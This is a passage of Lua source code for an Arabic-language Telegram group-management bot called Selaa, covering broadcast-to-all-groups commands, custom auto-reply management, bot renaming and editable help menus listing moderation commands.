local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆ارسل الرساله الان لتوجيها \n↯☆للخروج ارسل ⇇ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Selaa:get(Selaa.."Selaa:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم الغاء امر الاذاعه بنجاح", 1, 'md')
Selaa:del(Selaa.."Selaa:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = Selaa:smembers(Selaa..'Selaa:Groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم اذاعة رسالتك بالتوجيه \n↯☆‏في ⇇ ❨ "..#list.." ❩ مجموعه \n ✓", 1, 'md')
Selaa:del(Selaa.."Selaa:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Selaa     --
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "⇇ اذاعه خاص بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Selaa:get(Selaa.."Selaa:Send:Bot"..Selaa) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"↯☆الاذاعه معطله من قبل المطور الاساسي")
return false
end
Selaa:setex(Selaa.."Selaa:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆ارسل الرساله الان لتوجيها \n↯☆للخروج ارسل ⇇ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Selaa:get(Selaa.."Selaa:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم الغاء امر الاذاعه بنجاح", 1, 'md')
Selaa:del(Selaa.."Selaa:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = Selaa:smembers(Selaa..'Selaa:Users')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم اذاعة رسالتك بالتوجيه \n↯☆‏الى ⇇ ❨ "..#list.." ❩ مشترك \n ✓", 1, 'md')
Selaa:del(Selaa.."Selaa:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     Source Selaa     --
if text == "اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "⇇ اذاعه بالتثبيت ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if Selaa:get(Selaa.."Selaa:Send:Bot"..Selaa) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"↯☆الاذاعه معطله من قبل المطور الاساسي")
return false
end
Selaa:setex(Selaa.."Selaa:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆ارسل لي سواء ⇇ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n↯☆للخروج ارسل ⇇ ( الغاء ) \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if Selaa:get(Selaa.."Selaa:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم الغاء امر الاذاعه بنجاح", 1, 'md')
Selaa:del(Selaa.."Selaa:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = Selaa:smembers(Selaa.."Selaa:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
SelaaText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
Selaa:set(Selaa..'Selaa:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
SelaaText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
Selaa:set(Selaa..'Selaa:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
SelaaText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
Selaa:set(Selaa..'Selaa:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(list) do 
SelaaText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
Selaa:set(Selaa..'Selaa:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(list) do 
SelaaText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
Selaa:set(Selaa..'Selaa:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(list) do 
SelaaText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
Selaa:set(Selaa..'Selaa:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(list) do 
SelaaText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
Selaa:set(Selaa..'Selaa:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
SelaaText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
Selaa:set(Selaa..'Selaa:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم اذاعة "..SelaaText.." بالتثبيت \n↯☆‏في ⇇ ❨ "..#list.." ❩ مجموعه \n ✓", 1, 'md')
Selaa:del(Selaa.."Selaa:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
--     Source Selaa     --
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد' and Manager(msg) and ChCheck(msg) or msg.content_.text_ == 'مسح رد' and  Manager(msg) and ChCheck(msg) then
Selaa:set(Selaa..'Selaa:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_,'DelGpRed')
Selaa(msg.chat_id_, msg.id_, 1, "↯☆حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ == 'اضف رد' and Manager(msg) and ChCheck(msg) then
Selaa:set(Selaa..'Selaa:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_,'SetGpRed')
Selaa(msg.chat_id_, msg.id_, 1, "↯☆حسنا ارسل الكلمه الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local SetGpRed = Selaa:get(Selaa..'Selaa:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'')
if SetGpRed == 'SetGpRed' then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل لي الرد سواء كان ⇇ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n↯☆يمكنك اضافة الى النص ⇇ ⤈\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆للخروج ارسل ⇇ ( الغاء )\n ✓" ,  1, "md")
Selaa:set(Selaa..'Selaa:Add:GpRed'..msg.sender_user_id_..''..msg.chat_id_..'','SaveGpRed')
Selaa:set(Selaa..'Selaa:Add:GpText'..msg.sender_user_id_..''..msg.chat_id_..'',msg.content_.text_)
Selaa:sadd(Selaa..'Selaa:Manager:GpRed'..msg.chat_id_..'',msg.content_.text_)
Selaa:set(Selaa..'DelManagerRep'..msg.chat_id_..'',msg.content_.text_)
return false
end
end
--     Source Selaa     --
text = msg.content_.text_
if msg.content_.text_ == 'حذف رد عام' and Sudo(msg) or msg.content_.text_ == '⇇ حذف رد عام ⌁' and Sudo(msg) or msg.content_.text_ == 'مسح رد عام' and Sudo(msg) then
Selaa:set(Selaa.."Selaa:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Selaa(msg.chat_id_, msg.id_, 1, "↯☆حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if msg.content_.text_ == 'اضف رد عام' and Sudo(msg) or msg.content_.text_ == '⇇ اضف رد عام ⌁' and Sudo(msg) then
Selaa:set(Selaa.."Selaa:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Selaa(msg.chat_id_, msg.id_, 1, "↯☆حسنا ارسل الكلمه الان " ,  1, "md")
return false    end
if msg.content_.text_ then
local SetAllRed = Selaa:get(Selaa.."Selaa:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل لي الرد سواء كان ⇇ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n↯☆يمكنك اضافة الى النص ⇇ ⤈\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n↯☆للخروج ارسل ⇇ ( الغاء )\n ✓" ,  1, "md")
Selaa:set(Selaa.."Selaa:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
Selaa:set(Selaa.."Selaa:Add:AllText"..msg.sender_user_id_, msg.content_.text_)
Selaa:sadd(Selaa.."Selaa:Sudo:AllRed",msg.content_.text_)
Selaa:set(Selaa.."DelSudoRep",msg.content_.text_)
return false 
end end
--     Source Selaa     --
if msg.content_.text_ == 'الردود' and Manager(msg) and ChCheck(msg) or msg.content_.text_ == 'ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = Selaa:smembers(Selaa..'Selaa:Manager:GpRed'..msg.chat_id_..'')
MsgRep = '↯☆ردود المدير ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
if Selaa:get(Selaa.."Selaa:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif Selaa:get(Selaa.."Selaa:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif Selaa:get(Selaa.."Selaa:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif Selaa:get(Selaa.."Selaa:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif Selaa:get(Selaa.."Selaa:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif Selaa:get(Selaa.."Selaa:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif Selaa:get(Selaa.."Selaa:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif Selaa:get(Selaa.."Selaa:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..''..k..'~ (`'..v..'`) ⇇ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '↯☆لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
--     Source Selaa     --
if msg.content_.text_ == 'حذف الردود' and Manager(msg) and ChCheck(msg) or msg.content_.text_ == 'مسح الردود' and Manager(msg) and ChCheck(msg) or msg.content_.text_ == 'حذف ردود المدير' and Manager(msg) and ChCheck(msg) or msg.content_.text_ == 'مسح ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = Selaa:smembers(Selaa..'Selaa:Manager:GpRed'..msg.chat_id_..'')
if #redod == 0 then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
Selaa:del(Selaa..'Selaa:Gif:GpRed'..v..msg.chat_id_)
Selaa:del(Selaa..'Selaa:Voice:GpRed'..v..msg.chat_id_)
Selaa:del(Selaa..'Selaa:Audio:GpRed'..v..msg.chat_id_)
Selaa:del(Selaa..'Selaa:Photo:GpRed'..v..msg.chat_id_)
Selaa:del(Selaa..'Selaa:Stecker:GpRed'..v..msg.chat_id_)
Selaa:del(Selaa..'Selaa:Video:GpRed'..v..msg.chat_id_)
Selaa:del(Selaa..'Selaa:File:GpRed'..v..msg.chat_id_)
Selaa:del(Selaa..'Selaa:Text:GpRed'..v..msg.chat_id_)
Selaa:del(Selaa..'Selaa:Manager:GpRed'..msg.chat_id_)
end
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف ردود المدير\n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
return false
end
end
--     Source Selaa     --
if  msg.content_.text_ == "ردود المطور" and Sudo(msg) or msg.content_.text_ == "الردود العام" and Sudo(msg) or msg.content_.text_ == "ردود العام" and Sudo(msg) or msg.content_.text_ == "⇇ الردود العام ⌁" and Sudo(msg) then
local redod = Selaa:smembers(Selaa.."Selaa:Sudo:AllRed")
MsgRep = '↯☆ردود المطور ⇇ ⤈ \n┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
if Selaa:get(Selaa.."Selaa:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif Selaa:get(Selaa.."Selaa:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif Selaa:get(Selaa.."Selaa:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif Selaa:get(Selaa.."Selaa:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif Selaa:get(Selaa.."Selaa:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif Selaa:get(Selaa.."Selaa:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif Selaa:get(Selaa.."Selaa:File:AllRed"..v) then
dp = 'ملف 📁'
elseif Selaa:get(Selaa.."Selaa:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..''..k..'~ (`'..v..'`) ⇇ {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '↯☆لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
--     Source Selaa     --
if msg.content_.text_ == "حذف ردود المطور" and Sudo(msg) or msg.content_.text_ == "حذف ردود العام" and Sudo(msg) or msg.content_.text_ == "مسح ردود المطور" and Sudo(msg) then
local redod = Selaa:smembers(Selaa.."Selaa:Sudo:AllRed")
if #redod == 0 then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
Selaa:del(Selaa.."Selaa:Add:AllRed"..v)
Selaa:del(Selaa.."Selaa:Gif:AllRed"..v)
Selaa:del(Selaa.."Selaa:Voice:AllRed"..v)
Selaa:del(Selaa.."Selaa:Audio:AllRed"..v)
Selaa:del(Selaa.."Selaa:Photo:AllRed"..v)
Selaa:del(Selaa.."Selaa:Stecker:AllRed"..v)
Selaa:del(Selaa.."Selaa:Video:AllRed"..v)
Selaa:del(Selaa.."Selaa:File:AllRed"..v)
Selaa:del(Selaa.."Selaa:Text:AllRed"..v)
Selaa:del(Selaa.."Selaa:Sudo:AllRed")
end
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف ردود المطور \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
return false
end
end 
--     Source Selaa     --
if Admin(msg) then
if text and text == "تغيير اسم البوت" or text and text == "وضع اسم البوت" or text and text == "تغير اسم البوت" then
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆ارسل اسم البوت الان \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
Selaa:set(Selaa..'Selaa:NameBot'..msg.sender_user_id_..'', 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' or text == 'مسح اسم البوت' then
if not Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, '↯☆للمطور الاساسي فقط ', 1, 'md')
else
Selaa:del(Selaa..'Selaa:NameBot')
local SelaaTEAM = '↯☆اهلا عزيزي ⇇ '..SelaaRank(msg)..' \n↯☆تم حذف اسم البوت \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, SelaaTEAM, 14, string.len(msg.sender_user_id_))
end end 
--     Source Selaa     --
if text and text:match("^استعاده الاوامر$") and Sudo(msg) or text and text:match("^استعادة كلايش الاوامر$") and Sudo(msg) then
HelpList ={'Selaa:Help','Selaa:Help1','Selaa:Help2','Selaa:Help3','Selaa:Help4','Selaa:Help5','Selaa:Help6'}
for i,Help in pairs(HelpList) do
Selaa:del(Selaa..Help) 
end
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم استعادة الكلايش الاصليه" ,  1, "md") 
end
if text and text:match("^تعيين الاوامر$") and Sudo(msg) or text and text:match("^تعيين امر الاوامر$") and Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل كليشة (الاوامر) الان " ,  1, "md")
Selaa:set(Selaa..'Selaa:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SelaaTEAM =  Selaa:get(Selaa..'Selaa:Help0'..msg.sender_user_id_)
if SelaaTEAM == 'msg' then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ الكليشه الجديده " ,  1, "md")
Selaa:del(Selaa..'Selaa:Help0'..msg.sender_user_id_)
Selaa:set(Selaa..'Selaa:Help', text)
Selaa(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^الاوامر$") or text and text:match("^اوامر$") or text and text:match("^مساعده$") then
local Help = Selaa:get(Selaa..'Selaa:Help')
local text =  [[
↯☆اهلا بك في قائمة الاوامر ⇇ ⤈ 
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆م1 ⇇ اوامر الحمايه
↯☆م2 ⇇ اوامر الادمنيه
↯☆م3 ⇇ اوامر المدراء
↯☆م4 ⇇ اوامر المنشئين
↯☆م5 ⇇ اوامر المطورين
↯☆م6 ⇇ اوامر الاعضاء
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆[Source Channel](https://t.me/sourcesela)
]] 
Selaa(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
if text and text:match("^تعيين امر م1$") and Sudo(msg) or text and text:match("^تعيين امر م١$") and Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل كليشة (م1) الان " ,  1, "md")
Selaa:set(Selaa..'Selaa:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SelaaTEAM =  Selaa:get(Selaa..'Selaa:Help01'..msg.sender_user_id_)
if SelaaTEAM == 'msg' then 
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ الكليشه الجديده " ,  1, "md")
Selaa:del(Selaa..'Selaa:Help01'..msg.sender_user_id_)
Selaa:set(Selaa..'Selaa:Help1', text)
Selaa(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م1$") or text and text:match("^م١$") or text and text:match("^اوامر1$") or text and text:match("^اوامر١$") then
local Help = Selaa:get(Selaa..'Selaa:Help1')
local text =  [[
↯☆اوامر حماية المجموعه ⇇ ⤈
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆قفل • فتح ⇇ الروابط
↯☆قفل • فتح ⇇ المعرفات
↯☆قفل • فتح ⇇ البوتات
↯☆قفل • فتح ⇇ المتحركه
↯☆قفل • فتح ⇇ الملصقات
↯☆قفل • فتح ⇇ الملفات
↯☆قفل • فتح ⇇ الصور
↯☆قفل • فتح ⇇ الفيديو
↯☆قفل • فتح ⇇ الاونلاين
↯☆قفل • فتح ⇇ الدردشه
↯☆قفل • فتح ⇇ التوجيه
↯☆قفل • فتح ⇇ الاغاني
↯☆قفل • فتح ⇇ الصوت
↯☆قفل • فتح ⇇ الجهات
↯☆قفل • فتح ⇇ الماركداون
↯☆قفل • فتح ⇇ التكرار
↯☆قفل • فتح ⇇ الهاشتاك
↯☆قفل • فتح ⇇ التعديل
↯☆قفل • فتح ⇇ التثبيت
↯☆قفل • فتح ⇇ الاشعارات
↯☆قفل • فتح ⇇ الكلايش
↯☆قفل • فتح ⇇ الدخول
↯☆قفل • فتح ⇇ الشبكات
↯☆قفل • فتح ⇇ المواقع
↯☆قفل • فتح ⇇ الفشار
↯☆قفل • فتح ⇇ الكفر
↯☆قفل • فتح ⇇ الطائفيه
↯☆قفل • فتح ⇇ الكل
↯☆قفل • فتح ⇇ العربيه
↯☆قفل • فتح ⇇ الانجليزيه
↯☆قفل • فتح ⇇ الفارسيه
↯☆قفل • فتح ⇇ التفليش
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆اوامر حمايه اخرى ⇇ ⤈
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆قفل • فتح + الامر ⇇ ⤈
↯☆التكرار بالطرد
↯☆التكرار بالكتم
↯☆التكرار بالتقييد
↯☆الفارسيه بالطرد
↯☆البوتات بالطرد
↯☆البوتات بالتقييد
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆[Source Channel](https://t.me/sourcesela)
]]
Selaa(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
if text and text:match("^تعيين امر م2$") and Sudo(msg) or text and text:match("^تعيين امر م٢$") and Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل كليشة (م2) الان " ,  1, "md")
Selaa:set(Selaa..'Selaa:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SelaaTEAM =  Selaa:get(Selaa..'Selaa:Help21'..msg.sender_user_id_)
if SelaaTEAM == 'msg' then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ الكليشه الجديده " ,  1, "md")
Selaa:del(Selaa..'Selaa:Help21'..msg.sender_user_id_)
Selaa:set(Selaa..'Selaa:Help2', text)
Selaa(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م2$") or text and text:match("^م٢$") or text and text:match("^اوامر2$") or text and text:match("^اوامر٢$") then
local Help = Selaa:get(Selaa..'Selaa:Help2')
local text =  [[
↯☆اوامر الادمنيه ⇇ ⤈
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆الاعدادت
↯☆تاك للكل 
↯☆انشاء رابط
↯☆ضع وصف
↯☆ضع رابط
↯☆ضع صوره
↯☆حذف الرابط
↯☆حذف المطايه
↯☆كشف البوتات
↯☆طرد البوتات
↯☆تنظيف + العدد
↯☆تنظيف التعديل
↯☆قول + الكلمه
↯☆اسم البوت + الامر
↯☆ضع • حذف ⇇ ترحيب
↯☆ضع • حذف ⇇ قوانين
↯☆اضف • حذف ⇇ صلاحيه
↯☆الصلاحيات • حذف الصلاحيات
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆ضع سبام + العدد
↯☆ضع تكرار + العدد
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆رفع مميز • تنزيل مميز
↯☆المميزين • حذف المميزين
↯☆كشف القيود • رفع القيود
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆حذف • مسح + بالرد
↯☆منع • الغاء منع
↯☆قائمه المنع
↯☆حذف قائمه المنع
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆تفعيل • تعطيل ⇇ الرابط
↯☆تفعيل • تعطيل ⇇ الالعاب
↯☆تفعيل • تعطيل ⇇ الترحيب
↯☆تفعيل • تعطيل ⇇ كشف الاعدادات
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆طرد المحذوفين
↯☆طرد ⇇ بالرد • بالمعرف • بالايدي
↯☆كتم • الغاء كتم
↯☆تقيد • الغاء تقيد
↯☆حظر • الغاء حظر
↯☆المكتومين • حذف المكتومين
↯☆المقيدين • حذف المقيدين
↯☆المحظورين • حذف المحظورين
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆تقييد دقيقه + عدد الدقائق
↯☆تقييد ساعه + عدد الساعات
↯☆تقييد يوم + عدد الايام
↯☆الغاء تقييد ⇇ لالغاء التقييد بالوقت
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆[Source Channel](https://t.me/sourcesela)
]]
Selaa(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end
if text and text:match("^تعيين امر م3$") and Sudo(msg) or text and text:match("^تعيين امر م٣$") and Sudo(msg) then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆ارسل كليشة (م3) الان " ,  1, "md")
Selaa:set(Selaa..'Selaa:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local SelaaTEAM =  Selaa:get(Selaa..'Selaa:Help31'..msg.sender_user_id_)
if SelaaTEAM == 'msg' then
Selaa(msg.chat_id_, msg.id_, 1, "↯☆تم حفظ الكليشه الجديده " ,  1, "md")
Selaa:del(Selaa..'Selaa:Help31'..msg.sender_user_id_)
Selaa:set(Selaa..'Selaa:Help3', text)
Selaa(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م3$") or text and text:match("^م٣$") or text and text:match("^اوامر3$") or text and text:match("^اوامر٣$") then
local Help = Selaa:get(Selaa..'Selaa:Help3')
local text =  [[
↯☆اوامر المدراء ⇇ ⤈
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆فحص البوت
↯☆ضع اسم + الاسم
↯☆اضف • حذف ⇇ رد
↯☆ردود المدير
↯☆حذف ردود المدير
↯☆حذف قوائم المنع
↯☆منع ⇇ بالرد على ( ملصق • صوره • متحركه )
↯☆حذف قائمه منع + ⇇ ⤈
( الصور • المتحركات • الملصقات )
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆تنزيل الكل
↯☆رفع ادمن • تنزيل ادمن
↯☆الادمنيه • حذف الادمنيه
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆تثبيت
↯☆الغاء التثبيت
↯☆اعاده التثبيت
↯☆الغاء تثبيت الكل
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆تغير رد + اسم الرتبه + النص ⇇ ⤈
↯☆المطور • منشئ الاساسي
↯☆المنشئ • المدير • الادمن
↯☆المميز • المنظف • العضو
↯☆حذف ردود الرتب
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆تغيير الايدي ⇇ لتغيير الكليشه
↯☆تعيين الايدي ⇇ لتعيين الكليشه
↯☆حذف الايدي ⇇ لحذف الكليشه
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
↯☆تفعيل • تعطيل + الامر ⇇ ⤈
↯☆اطردني • الايدي بالصوره
↯☆الابراج • معاني الاسماء
↯☆الايدي • اوامر النسب
↯☆ردود المدير • ردود المطور
↯☆ضافني • حساب العمر • الزخرفه
┉ ≈ ┉ ≈ ᵴᵉℒᗩ≈ ┉ ≈ ┉
